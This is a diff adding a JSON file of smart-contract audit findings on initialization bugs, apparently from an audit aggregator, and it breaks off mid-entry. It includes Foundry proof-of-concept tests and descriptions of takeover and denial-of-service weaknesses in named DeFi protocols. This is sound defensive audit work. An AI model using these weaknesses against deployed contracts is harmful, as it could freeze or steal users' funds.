@@ -1,0 +1,1070 @@
+{
+  "tag": "Initialization",
+  "count": 15,
+  "metadata": {
+    "totalResults": 15,
+    "totalPages": 1
+  },
+  "last_rateLimit": {
+    "limit": 20,
+    "remaining": 17,
+    "reset": 1771761120
+  },
+  "findings": [
+    {
+      "id": "37987",
+      "kind": "GIT",
+      "auditfirm_id": "20",
+      "impact": "MEDIUM",
+      "finders_count": 18,
+      "protocol_id": "1600",
+      "title": "An Uninitialized Variable In The `MarketConfiguration::update` Function Causes The `PrepMarket::getIndexPrice` Function To Revert",
+      "content": "## Summary:\n\nThe `update` function within the `MarketConfiguration` library fails to update the `priceFeedHeartbeatSeconds` variable, which is essential for the `getIndexPrice` function to operate correctly. This oversight causes the `getIndexPrice` function to always revert due to an uninitialized heartbeat check.\n\n## Vulnerability Detail:\n\nIn the `MarketConfiguration` library, the `update` function is designed to update various market configuration parameters. However, it neglects to update the `priceFeedHeartbeatSeconds` variable. Consequently, this variable remains uninitialized, defaulting to zero.\n\nThe `getIndexPrice` function relies on the `priceFeedHeartbeatSeconds` variable to validate the timeliness of the price feed data from Chainlink oracles. When it checks `if (block.timestamp - updatedAt > priceFeedHeartbeatSeconds)`, the comparison always results in `true` (since `priceFeedHeartbeatSeconds` is zero), causing the function to revert every time it is called.\n\n## Impact:\n\nThis vulnerability significantly impacts the functionality of the protocol by making the price checking mechanism always revert. As a result, it effectively halts the correct operation of any process relying on the `getIndexPrice` function. Specifically, it renders the entire price validation mechanism inoperative, potentially disrupting market operations.\n\nThese are the list of functions that got affected by this vulnerability includes:\n\n1. `PerpMarket::getIndexPrice`\n2. `TradingAccountBranch::getAccountEquityUsd`\n3. `TradingAccountBranch::getAccountMarginBreakdown`\n4. `TradingAccountBranch::getAccountTotalUnrealizedPnl`\n5. `TradingAccountBranch::getAccountLeverage`\n6. `TradingAccountBranch::withdrawMargin`\n7. `SettlementBranch::fillMarketOrder`\n8. `SettlementBranch::fillOffchainOrders`\n9. `OrderBranch::simulateTrade`\n10. `OrderBranch::getMarginRequirementForTrade`\n11. `LiquidationBranch::liquidateAccount`\n12. `LiquidationBranch::checkLiquidatableAccounts`\n\n## Code Snippet:\n\nhttps://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/leaves/MarketConfiguration.sol#L37-L47\n\n```javascript\nstruct Data {\n        string name;\n        string symbol;\n        address priceAdapter;\n        uint128 initialMarginRateX18;\n        uint128 maintenanceMarginRateX18;\n        uint128 maxOpenInterest;\n        uint128 maxSkew;\n        uint128 maxFundingVelocity;\n        uint128 minTradeSizeX18;\n        uint256 skewScale;\n        OrderFees.Data orderFees;\n        uint32 priceFeedHeartbeatSeconds;\n    }\n\n    /// @notice Updates the given market configuration.\n    /// @dev See {MarketConfiguration.Data} for parameter details.\n    function update(Data storage self, Data memory params) internal {\n        self.name = params.name;\n        self.symbol = params.symbol;\n        self.priceAdapter = params.priceAdapter;\n        self.initialMarginRateX18 = params.initialMarginRateX18;\n        self.maintenanceMarginRateX18 = params.maintenanceMarginRateX18;\n        self.maxOpenInterest = params.maxOpenInterest;\n        self.maxSkew = params.maxSkew;\n        self.maxFundingVelocity = params.maxFundingVelocity;\n        self.minTradeSizeX18 = params.minTradeSizeX18;\n        self.skewScale = params.skewScale;\n        self.orderFees = params.orderFees;\n    @>  // Missing update for priceFeedHeartbeatSeconds\n    }\n```\n\n## Proof Of Concept:\n\n1. While creating a new market configuration, the `priceFeedHeartbeatSeconds` param is given a non-zero value.\n2. The `update` function is called to update the market configuration.\n3. The `update` function never initializes the `priceFeedHeartbeatSeconds` variable, causing it to default to zero.\n4. When the `getIndexPrice` function is called, that invokes the Chainlink oracle to fetch the price data.\n5. The function `getPrice` reverts due to the uninitialized `priceFeedHeartbeatSeconds` variable.\n\nHere is the commands to test:\n\n```bash\n## Add the following to the foundry.toml with Alchemy API key\n[rpc_endpoints]\narbitrum_sepolia = \"https://arb-sepolia.g.alchemy.com/v2/${API_KEY_ALCHEMY}\n```\n\nTo test the POC, run the following Forge test:\n\n```bash\nforge test --mt test_FortisAudits_IndexPriceGetsDOS -vvvv\n```\n\n**Proof Of Code:**\n\nAdd the following code to the Base.t.sol file:\n\n```javascript\n// Creating the prepmarket suitable for the fork test\nfunction createPerpMarketsFork() internal {\n        createPerpMarkets(\n            users.owner.account,\n            perpsEngine,\n            INITIAL_MARKET_ID,\n            FINAL_MARKET_ID,\n            IVerifierProxy(mockChainlinkVerifier),\n            false\n        );\n\n        for (uint256 i = INITIAL_MARKET_ID; i <= FINAL_MARKET_ID; i++) {\n            vm.label({ account: marketOrderKeepers[i], newLabel: \"Market Order Keeper Fork\" });\n        }\n    }\n```\n\nPOC:\n\n```javascript\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.25;\n\nimport { Base_Test } from \"./Base.t.sol\";\nimport { UD60x18, ud60x18 } from \"@prb-math/UD60x18.sol\";\nimport { SD59x18 } from \"@prb-math/SD59x18.sol\";\nimport { Errors } from \"@zaros/utils/Errors.sol\";\n\n// Forked arb-sepolia test\ncontract BugTest is Base_Test {\n    function setUp() public override {\n        uint256 forkId = vm.createFork(\"https://sepolia-rollup.arbitrum.io/rpc\");\n        vm.selectFork(forkId);\n        Base_Test.setUp();\n        changePrank({ msgSender: users.owner.account });\n        configureSystemParameters();\n        createPerpMarketsFork();\n    }\n\n    function test_FortisAudits_IndexPriceGetsDOS() public {\n        address ETH_USD = address(0xd30e2101a97dcbAeBCBC04F14C3f624E67A35165);\n        deal({ token: address(usdc), to: users.naruto.account, give: 1000e6 });\n        changePrank({ msgSender: users.naruto.account });\n        createAccountAndDeposit(1000e6, address(usdc));\n        vm.expectRevert(abi.encodeWithSelector(Errors.OraclePriceFeedHeartbeat.selector, ETH_USD));\n        // Calling the index price for the ETH_USD marketid\n        perpsEngine.exposed_getIndexPrice(2);\n    }\n}\n```\n\nForge Test stack trace:\n\n```javascript\n├─ [36319] Perps Engine::exposed_getIndexPrice(2) [staticcall]\n    │   ├─ [31069] PerpMarketHarness::exposed_getIndexPrice(2) [delegatecall]\n    │   │   ├─ [27534] PerpMarket::a75e8fff(f2a828f98ebacfcc9ead142282f1b781df57bae404a8d1fa83ab68dfbae58f25) [delegatecall]\n    │   │   │   ├─ [5595] 0xd30e2101a97dcbAeBCBC04F14C3f624E67A35165::decimals() [staticcall]\n    │   │   │   │   ├─ [253] 0xf3138B59cAcbA1a4d7d24fA7b184c20B3941433e::decimals() [staticcall]\n    │   │   │   │   │   └─ ← [Return] 8\n    │   │   │   │   └─ ← [Return] 8\n    │   │   │   ├─ [11235] 0xd30e2101a97dcbAeBCBC04F14C3f624E67A35165::latestRoundData() [staticcall]\n    │   │   │   │   ├─ [7502] 0xf3138B59cAcbA1a4d7d24fA7b184c20B3941433e::latestRoundData() [staticcall]\n    │   │   │   │   │   └─ ← [Return] 330001 [3.3e5], 314332890000 [3.143e11], 1721921867 [1.721e9], 1721921867 [1.721e9], 330001 [3.3e5]\n    │   │   │   │   └─ ← [Return] 18446744073709881617 [1.844e19], 314332890000 [3.143e11], 1721921867 [1.721e9], 1721921867 [1.721e9], 18446744073709881617 [1.844e19]\n    │   │   │   └─ ← [Revert] OraclePriceFeedHeartbeat(0xd30e2101a97dcbAeBCBC04F14C3f624E67A35165)\n    │   │   └─ ← [Revert] OraclePriceFeedHeartbeat(0xd30e2101a97dcbAeBCBC04F14C3f624E67A35165)\n    │   └─ ← [Revert] OraclePriceFeedHeartbeat(0xd30e2101a97dcbAeBCBC04F14C3f624E67A35165)\n    └─ ← [Stop]\n```\n\n## Recommendations\n\nTo resolve this issue, ensure that the `priceFeedHeartbeatSeconds` variable is appropriately updated within the `update` function. Here is the recommended mitigation:\n\n```diff\nstruct Data {\n        string name;\n        string symbol;\n        address priceAdapter;\n        uint128 initialMarginRateX18;\n        uint128 maintenanceMarginRateX18;\n        uint128 maxOpenInterest;\n        uint128 maxSkew;\n        uint128 maxFundingVelocity;\n        uint128 minTradeSizeX18;\n        uint256 skewScale;\n        OrderFees.Data orderFees;\n        uint32 priceFeedHeartbeatSeconds;\n    }\n\n    /// @notice Updates the given market configuration.\n    /// @dev See {MarketConfiguration.Data} for parameter details.\n    function update(Data storage self, Data memory params) internal {\n        self.name = params.name;\n        self.symbol = params.symbol;\n        self.priceAdapter = params.priceAdapter;\n        self.initialMarginRateX18 = params.initialMarginRateX18;\n        self.maintenanceMarginRateX18 = params.maintenanceMarginRateX18;\n        self.maxOpenInterest = params.maxOpenInterest;\n        self.maxSkew = params.maxSkew;\n        self.maxFundingVelocity = params.maxFundingVelocity;\n        self.minTradeSizeX18 = params.minTradeSizeX18;\n        self.skewScale = params.skewScale;\n        self.orderFees = params.orderFees;\n+       self.priceFeedHeartbeatSeconds = params.priceFeedHeartbeatSeconds;\n    }\n```\n\nBy including this update, the `priceFeedHeartbeatSeconds` variable will hold the correct value, allowing the `getIndexPrice` function to perform as intended without unnecessary reverts.",
+      "summary": "\nThis bug report highlights a high-risk issue in the `MarketConfiguration` library that affects the functionality of the protocol. The `update` function does not properly update the `priceFeedHeartbeatSeconds` variable, causing it to default to zero. This results in the `getIndexPrice` function always reverting when it is called, disrupting market operations. The affected functions include those related to price validation, trading accounts, and liquidation. A code snippet and proof of concept are provided to demonstrate the issue. To resolve this, the `priceFeedHeartbeatSeconds` variable should be correctly updated within the `update` function. ",
+      "report_date": {},
+      "contest_prize_txt": "60000 USDC",
+      "contest_link": "https://codehawks.cyfrin.io/c/clyg8slke0001bvhpwszwjr7z",
+      "sponsor_name": "Zaros",
+      "sponsor_link": "",
+      "quality_score": 0,
+      "general_score": 0,
+      "source_link": "",
+      "github_link": "https://github.com/Cyfrin/2024-07-zaros",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "clyg8slke0001bvhpwszwjr7z",
+      "slug": "an-uninitialized-variable-in-the-marketconfigurationupdate-function-causes-the-prepmarketgetindexprice-function-to-revert-codehawks-zaros-git",
+      "firm_name": "Codehawks",
+      "firm_logo_square": "codehawks_square.png",
+      "protocol_name": "Zaros",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Codehawks",
+        "logo_square": "codehawks_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Zaros",
+        "protocols_protocolcategoryscore": []
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Initialization"
+          }
+        }
+      ]
+    },
+    {
+      "id": "26227",
+      "kind": "MARKDOWN",
+      "auditfirm_id": "8",
+      "impact": "MEDIUM",
+      "finders_count": 2,
+      "protocol_id": "1083",
+      "title": "No Protection of Uninitialized Implementation Contracts From Attacker",
+      "content": "#### Description\n\n\nIn the contracts implement Openzeppelin’s UUPS model, uninitialized implementation contract can be taken over by an attacker with `initialize` function, it’s recommended to invoke the `_disableInitializers` function in the constructor to prevent the implementation contract from being used by the attacker. However all the contracts which implements `OwnablePausableUpgradeable` do not call `_disableInitializers` in the constructors\n\n\n#### Examples\n\n\n**contracts/tokens/Rewards.sol:L25**\n\n\n\n```\ncontract Rewards is IRewards, OwnablePausableUpgradeable, ReentrancyGuardUpgradeable {\n\n```\n**contracts/pool/Pool.sol:L20**\n\n\n\n```\ncontract Pool is IPool, OwnablePausableUpgradeable, ReentrancyGuardUpgradeable {\n\n```\n**contracts/tokens/StakedLyxToken.sol:L46**\n\n\n\n```\ncontract StakedLyxToken is OwnablePausableUpgradeable, LSP4DigitalAssetMetadataInitAbstract, IStakedLyxToken, ReentrancyGuardUpgradeable {\n\n```\netc.\n\n\n#### Recommendation\n\n\nInvoke `_disableInitializers` in the constructors of contracts which implement `OwnablePausableUpgradeable` including following:\n\n\n\n```\nPool\r\nPoolValidators\r\nFeeEscrow\r\nReward\r\nStakeLyxTokem\r\nOracles \r\nMerkleDistributor\n\n```",
+      "summary": "\nThis bug report is about contracts that implement Openzeppelin’s UUPS model. It is possible for an attacker to take over an uninitialized implementation contract with the `initialize` function. To prevent this from happening, it is recommended to invoke the `_disableInitializers` function in the constructor. However, all the contracts which implement `OwnablePausableUpgradeable` do not call `_disableInitializers` in the constructors. Examples of such contracts are Rewards, Pool, StakedLyxToken, PoolValidators, FeeEscrow, Reward, StakeLyxTokem, Oracles and MerkleDistributor. To fix the issue, the recommendation is to invoke `_disableInitializers` in the constructors of all contracts which implement `OwnablePausableUpgradeable`.",
+      "report_date": {},
+      "contest_prize_txt": "",
+      "contest_link": "",
+      "sponsor_name": null,
+      "sponsor_link": "",
+      "quality_score": 4,
+      "general_score": 2,
+      "source_link": "https://consensys.net/diligence/audits/2023/09/leequid-staking/",
+      "github_link": "",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "",
+      "slug": "no-protection-of-uninitialized-implementation-contracts-from-attacker-consensys-none-leequid-staking-markdown",
+      "firm_name": "ConsenSys",
+      "firm_logo_square": "consensys_square.png",
+      "protocol_name": "LEEQUID - Staking",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "ConsenSys",
+        "logo_square": "consensys_square.png"
+      },
+      "protocols_protocol": {
+        "name": "LEEQUID - Staking",
+        "protocols_protocolcategoryscore": []
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Initializer"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "initializer modifier"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Initialization"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Constructor"
+          }
+        }
+      ]
+    },
+    {
+      "id": "21141",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "HIGH",
+      "finders_count": 1,
+      "protocol_id": "933",
+      "title": "[H-04] The Constructor Caveat leads to bricking of Configurator contract.",
+      "content": "\nIn Solidity, code that is inside a constructor or part of a global variable declaration is not part of a deployed contract's runtime bytecode. This code is executed only once, when the contract instance is deployed. As a consequence of this, the code within a logic contract's constructor will never be executed in the context of the proxy's state. This means that any state changes made in the constructor of a logic contract will not be reflected in the proxy's state.\n1.  This will lead to governance timelocks contract and the `curvePool` contract contain default values of zero values.\n2.  As a result, all the functions that rely on governance will be broken, since the governance address is set to zero address.\n\n### Proof of Concept\n\n```\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\nimport {ITransparentUpgradeableProxy} from \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\n\nimport {LybraProxy} from \"@lybra/Proxy/LybraProxy.sol\";\nimport {LybraProxyAdmin} from \"@lybra/Proxy/LybraProxyAdmin.sol\";\nimport {GovernanceTimelock} from \"@lybra/governance/GovernanceTimelock.sol\";\nimport {PeUSDMainnet} from \"@lybra/token/PeUSDMainnetStableVision.sol\";\nimport {Configurator} from \"@lybra/configuration/LybraConfigurator.sol\";\nimport {EUSDMock} from \"@mocks/mockEUSD.sol\";\nimport {mockCurve} from \"@mocks/mockCurve.sol\";\nimport {mockUSDC} from \"@mocks/mockUSDC.sol\";\n\n/* remappings used\n@lybra=contracts/lybra/\n@mocks=contracts/mocks/\n */\ncontract CounterScript is Test {\n    address goerliEndPoint = 0xbfD2135BFfbb0B5378b56643c2Df8a87552Bfa23;\n\n    LybraProxy proxy;\n    LybraProxyAdmin admin;\n    GovernanceTimelock govTimeLock;\n    mockUSDC usdc;\n    mockCurve curve;\n    Configurator configurator;\n    Configurator configuratorLogic;\n     EUSDMock eusd;\n    PeUSDMainnet peUsdMainnet;\n    address owner = address(7);\n    address[] govTimelockArr;\n\n     function setUp() public {\n         vm.startPrank(owner);\n         govTimelockArr.push(owner);\n         govTimeLock = new GovernanceTimelock(\n             1,\n             govTimelockArr,\n             govTimelockArr,\n             owner\n         );\n\n         usdc = new mockUSDC();\n         curve = new mockCurve();\n         eusd = new EUSDMock(address(configurator));\n         //  _dao , _curvePool\n         configuratorLogic = new Configurator(address(govTimeLock), address(curve));\n\n         admin = new LybraProxyAdmin();\n         proxy = new LybraProxy(address(configuratorLogic),address(admin),bytes(\"\"));\n         configurator = Configurator(address(proxy));\n\n        peUsdMainnet = new PeUSDMainnet(\n             address(configurator),\n             8,\n             goerliEndPoint\n         );\n         vm.stopPrank();\n    }\n\n    function test_LybraConfigurationContractDoesNotInitialize() public {\n        vm.startPrank(address(owner));\n        vm.expectRevert(); // Since the Governance time lock is set to zero. \n        configurator.initToken(address(eusd), address(peUsdMainnet));\n    }\n}\n```\n\n### Tools Used\n\n1.  Manual Code review\n2.  Foundry for POC\n\n### Recommended Mitigation Steps\n\n[LybraConfiguration.sol#L81](https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/configuration/LybraConfigurator.sol#L81) contracts should move the code within the constructor to a regular \"initializer\" function, and have this function be called whenever the proxy links to this logic contract. Special care needs to be taken with this initializing function so that it can only be called once and use another initialization mechanism, since the governance address should be set in the initialize.\n\n### Assessed type\n\nUpgradable\n\n**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/673#issuecomment-1635556436)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/673#issuecomment-1655885310):**\n > On the fence re: severity here and could see the argument for this being M.  Will leave as submitted for now, but open to comment during QA on the topic. \n\n***\n\n",
+      "summary": "\nThis bug report covers a bug found in Solidity code that is part of the LybraFinance system. The code is inside a constructor or part of a global variable declaration, and is not part of a deployed contract's runtime bytecode. This means that any state changes made in the constructor of a logic contract will not be reflected in the proxy's state. As a result, all the functions that rely on governance will be broken since the governance address is set to zero address.\n\nTo mitigate this issue, the code within the constructor should be moved to a regular \"initializer\" function, which should be called whenever the proxy links to this logic contract. Special care needs to be taken with this initializing function so that it can only be called once and use another initialization mechanism, since the governance address should be set in the initialize. Manual code review and Foundry for POC were used to identify and confirm the bug. The assessed type for this bug is Upgradable.",
+      "report_date": {},
+      "contest_prize_txt": "$60,500 USDC",
+      "contest_link": "https://code4rena.com/reports/2023-06-lybra",
+      "sponsor_name": "Lybra Finance",
+      "sponsor_link": "",
+      "quality_score": 3,
+      "general_score": 2,
+      "source_link": "https://code4rena.com/reports/2023-06-lybra",
+      "github_link": "https://github.com/code-423n4/2023-06-lybra-findings/issues/673",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "254",
+      "slug": "h-04-the-constructor-caveat-leads-to-bricking-of-configurator-contract-code4rena-lybra-finance-lybra-finance-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Lybra Finance",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Lybra Finance",
+        "protocols_protocolcategoryscore": []
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Initialization"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Upgradable"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Initializer"
+          }
+        }
+      ]
+    },
+    {
+      "id": "6283",
+      "kind": "GIT",
+      "auditfirm_id": "3",
+      "impact": "MEDIUM",
+      "finders_count": 13,
+      "protocol_id": "54",
+      "title": "M-2: Loan is rollable by default",
+      "content": "Source: https://github.com/sherlock-audit/2023-01-cooler-judging/issues/265 \n\n## Found by \nhansfriese, Nyx, enckrish, wagmi, yixxas, HollaDieWaldfee, HonorLt, Tricko, Zarf, libratus, simon135, usmannk, Trumpero\n\n## Summary\nMaking the loan rollable by default gives an unfair early advantage to the borrowers.\n\n## Vulnerability Detail\nWhen clearing a new loan, the flag of ```rollable``` is set to true by default:\n```solidity\n    loans.push(\n        Loan(req, req.amount + interest, collat, expiration, true, msg.sender)\n    );\n```\nThis means a borrower can extend the loan anytime before the expiry:\n```solidity\n    function roll (uint256 loanID) external {\n        Loan storage loan = loans[loanID];\n        Request memory req = loan.request;\n\n        if (block.timestamp > loan.expiry) \n            revert Default();\n\n        if (!loan.rollable)\n            revert NotRollable();\n```\nIf the lenders do not intend to allow rollable loans, they should separately toggle the status to prevent that:\n```solidity\n    function toggleRoll(uint256 loanID) external returns (bool) {\n        ...\n        loan.rollable = !loan.rollable;\n        ...\n    }\n```\n\nI believe it gives an unfair advantage to the borrower because they can re-roll the loan before the lender's transaction forbids this action.\n\n## Impact\nLenders who do not want the loans to be used more than once, have to bundle their transactions. Otherwise, it is possible that someone might roll their loan, especially if the capital requirements are not huge because anyone can roll any loan.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L177\n\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L191\n\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L126-L147\n\n## Tool used\n\nManual Review\n\n## Recommendation\nI believe ```rollable``` should be set to false by default or at least add an extra function parameter to determine the initial value of this status.\n\n## Discussion\n\n**hrishibhat**\n\nSponsor comment:\n> Valid. Will default to false.\n\n\n**sherlock-admin**\n\n> Retracted since https://github.com/sherlock-audit/2023-01-cooler-judging/issues/215 shows that there can be circumstances where funds lose value over the life of the loan\n\nYou've deleted an escalation for this issue.",
+      "summary": "\nThis bug report is about an issue with the loan system of a project. The issue is that when clearing a new loan, the flag of ```rollable``` is set to true by default. This means a borrower can extend the loan anytime before the expiry, giving them an unfair advantage over the lenders. To prevent this, the lenders have to separately toggle the status to false. It is also possible for someone to roll their loan, especially if the capital requirements are not huge. The recommendation is to set ```rollable``` to false by default or add an extra function parameter to determine the initial value of this status. The issue was discussed and it was decided that the ```rollable``` flag should be set to false by default.",
+      "report_date": {},
+      "contest_prize_txt": "10000 USDC",
+      "contest_link": "https://app.sherlock.xyz/audits/contests/36",
+      "sponsor_name": "cooler",
+      "sponsor_link": "",
+      "quality_score": 4,
+      "general_score": 4,
+      "source_link": "",
+      "github_link": "https://github.com/sherlock-audit/2023-01-cooler-judging/issues/265",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "36",
+      "slug": "m-2-loan-is-rollable-by-default-sherlock-cooler-cooler-git",
+      "firm_name": "Sherlock",
+      "firm_logo_square": "sherlock_square.png",
+      "protocol_name": "Cooler",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Sherlock",
+        "logo_square": "sherlock_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Cooler",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "CDP"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Services"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Cross Chain"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "NFT Lending"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Initialization"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Business Logic"
+          }
+        }
+      ]
+    },
+    {
+      "id": "7024",
+      "kind": "PDF",
+      "auditfirm_id": "6",
+      "impact": "MEDIUM",
+      "finders_count": 5,
+      "protocol_id": "53",
+      "title": "Add missing input validation on constructor/initializer/setters",
+      "content": "## Severity: Medium Risk\n\n## Description: Allowlist.1.sol\n\n- `initAllowlistV1` should require the `_admin` parameter to be not equal to `address(0)`. This check is not needed if the issue with `LibOwnable._setAdmin` allows setting `address(0)` as the admin of the contract is implemented directly at `LibOwnable._setAdmin` level.\n- `allow` should check that `_accounts[i]` is not equal to `address(0)`.\n\n## Firewall.sol\n\n- Constructor should check that: `governor_ != address(0)`, `executor_ != address(0)`, `destination_ != address(0)`.\n- `setGovernor` should check that `newGovernor` is not equal to `address(0)`.\n- `setExecutor` should check that `newExecutor` is not equal to `address(0)`.\n\n## OperatorsRegistry.1.sol\n\n- `initOperatorsRegistryV1` should require the `_admin` parameter to be not equal to `address(0)`. This check is not needed if the issue with `LibOwnable._setAdmin` allows setting `address(0)` as the admin of the contract is implemented directly at `LibOwnable._setAdmin` level.\n- `addOperator` should check: `_name` is not an empty string, `_operator` is not equal to `address(0)`, and `_feeRecipient` is not equal to `address(0)`.\n- `setOperatorAddress` should check that `_newOperatorAddress` is not equal to `address(0)`.\n- `setOperatorFeeRecipientAddress` should check that `_newOperatorFeeRecipientAddress` is not equal to `address(0)`.\n- `setOperatorName` should check that `_newName` is not an empty string.\n\n## Oracle.1.sol\n\n- `initOracleV1` should require the `_admin` parameter to be not equal to `address(0)`. This check is not needed if the issue with `LibOwnable._setAdmin` allows setting `address(0)` as the admin of the contract is implemented directly at `LibOwnable._setAdmin` level. Consider also adding some min and max limit to the values of `_annualAprUpperBound` and `_relativeLowerBound`, and ensure that `_epochsPerFrame`, `_slotsPerEpoch`, `_secondsPerSlot`, and `_genesisTime` match the expected values.\n- `addMember` should check that `_newOracleMember` is not equal to `address(0)`.\n- `setBeaconBounds`: Consider adding min/max values that `_annualAprUpperBound` and `_relativeLowerBound` should respect.\n\n## River.1.sol\n\n- `initRiverV1`: \n  - `_globalFee` should follow the same validation done in `setGlobalFee`. Note that the client said 0 is a valid `_globalFee` value. \n    > \"The revenue redistribution would be computed off-chain and paid by the treasury in that case. It's still an ongoing discussion they're having at Alluvial.\"\n  - `_operatorRewardsShare` should follow the same validation done in `setOperatorRewardsShare`. Note that the client said 0 is a valid `_operatorRewardsShare` value.\n    > \"The revenue redistribution would be computed off-chain and paid by the treasury in that case. It's still an ongoing discussion they're having at Alluvial.\"\n\n## ConsensusLayerDepositManager.1.sol\n\n- `initConsensusLayerDepositManagerV1`: `_withdrawalCredentials` should not be empty and follow the requirements expressed in the following official Consensus Specs document.\n\n## Recommendation\n\nConsider implementing all the checks suggested above. \n\n### Alluvial\n\nRecommendation implemented in `SPEARBIT/10`. Some validation checks, like ensuring the admin is not `address(0)`, will be addressed in another PR.\n\n### Spearbit\n\nOnly an empty check is performed on `_withdrawalCredentials`. `_annualAprUpperBound` and `_relativeLowerBound` are still not checked in both `initOracleV1` and `setReportBounds`.",
+      "summary": "\nThis bug report is about the contracts Allowlist.1.sol, Firewall.sol, OperatorsRegistry.1.sol, Oracle.1.sol, River.1.sol and ConsensusLayerDepositManager.1.sol. The bug report recommends to implement checks to ensure that the address(0) is not used in the parameters of the contracts. The report also recommends adding min and max limits to the values of _annualAprUpperBound and _relativeLowerBound in Oracle.1.sol and _withdrawalCredentials in ConsensusLayerDepositManager.1.sol. The bug report has been implemented in SPEARBIT/10 and some validation checks will be addressed in another PR.",
+      "report_date": {},
+      "contest_prize_txt": "",
+      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
+      "sponsor_name": "",
+      "sponsor_link": "",
+      "quality_score": 2.5,
+      "general_score": 2,
+      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
+      "github_link": "",
+      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/LiquidCollective-Spearbit-Security-Review.pdf",
+      "pdf_page_from": 27,
+      "contest_id": "",
+      "slug": "add-missing-input-validation-on-constructorinitializersetters-spearbit-liquid-collective-pdf",
+      "firm_name": "Spearbit",
+      "firm_logo_square": "spearbit_square.png",
+      "protocol_name": "Liquid Collective",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Spearbit",
+        "logo_square": "spearbit_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Liquid Collective",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Staking Pool"
+            },
+            "score": 67.10914421941607
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Liquid Staking"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Services"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield Aggregator"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Cross Chain"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Validation"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Initialization"
+          }
+        }
+      ]
+    },
+    {
+      "id": "7141",
+      "kind": "PDF",
+      "auditfirm_id": "6",
+      "impact": "HIGH",
+      "finders_count": 5,
+      "protocol_id": "72",
+      "title": "Unauthorized access to change acceptanceDelay",
+      "content": "## Vulnerability Report\n\n## Severity\n**High Risk**\n\n## Context\n**File:** DiamondInit.sol  \n**Lines:** 35-L40\n\n## Description\nThe `acceptanceDelay` along with `supportedInterfaces[]` can be set by any user without the need of any Authorization once the init function of `DiamondInit` has been called and set. This is happening since caller checks (`LibDiamond.enforceIsContractOwner();`) are missing for these fields. \n\nSince `acceptanceDelay` defines the time post which certain action could be executed, setting a very large value could cause a Denial of Service (DOS) to the system (the new owner cannot be set) and setting a very low value could allow changes to be made without consideration time (such as Setting/Renouncing Admin, Disabling whitelisting etc. at `ProposedOwnableFacet.sol`).\n\n## Recommendation\nChange the function implementation as shown below:\n\n```solidity\nLibDiamond.DiamondStorage storage ds = LibDiamond.diamondStorage();\n// Current implementation\n- ds.supportedInterfaces[type(IERC165).interfaceId] = true;\n- ds.supportedInterfaces[type(IDiamondCut).interfaceId] = true;\n- ds.supportedInterfaces[type(IDiamondLoupe).interfaceId] = true;\n- 